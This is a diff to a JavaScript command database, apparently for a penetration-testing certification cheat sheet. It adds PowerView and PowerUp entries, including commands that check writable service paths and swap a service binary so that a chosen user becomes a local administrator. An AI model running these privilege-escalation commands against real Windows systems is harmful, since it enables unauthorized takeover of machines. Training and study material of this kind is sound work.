@@ -55547,6 +55547,10 @@ const COMMAND_DATA = {
         {
           "label": "Domain SID",
           "command": "Get-DomainSID"
+        },
+        {
+          "label": "Deprecated PowerView alias (OSCP PEN-200 Ch21)",
+          "command": "Get-NetDomain   # older PowerView name for Get-Domain — identical output"
         }
       ]
     },
@@ -81554,6 +81558,14 @@ const COMMAND_DATA = {
         {
           "label": "PowerUp auto-abuse",
           "command": "Invoke-ServiceAbuse -Name '<service>' -Command 'net localgroup administrators <user> /add'"
+        },
+        {
+          "label": "PowerUp writable-path check (OSCP PEN-200 Ch16)",
+          "command": "Get-ModifiablePath -Path <service_binary_or_dir>   # PowerUp: test if current user can write the path"
+        },
+        {
+          "label": "PowerUp binary replace (OSCP PEN-200 Ch16)",
+          "command": "Install-ServiceBinary -Name '<service>'   # PowerUp: swap the service binary for one that adds a local admin"
         }
       ],
       "steps": [
@@ -81864,6 +81876,10 @@ const COMMAND_DATA = {
         {
           "label": "PowerUp",
           "command": "Get-ServiceUnquoted -Verbose"
+        },
+        {
+          "label": "PowerUp alias (OSCP PEN-200 Ch16)",
+          "command": "Get-UnquotedService   # renamed alias of Get-ServiceUnquoted in newer PowerUp"
         }
       ],
       "steps": [
@@ -90558,7 +90574,7 @@ const COMMAND_DATA = {
     }
   ],
   "totalCommands": 908,
-  "buildDate": "2026-09-02T12:20:19.207Z",
+  "buildDate": "2026-09-02T12:44:24.043Z",
   "certifications": [
     "CDSA",
     "CPTS",
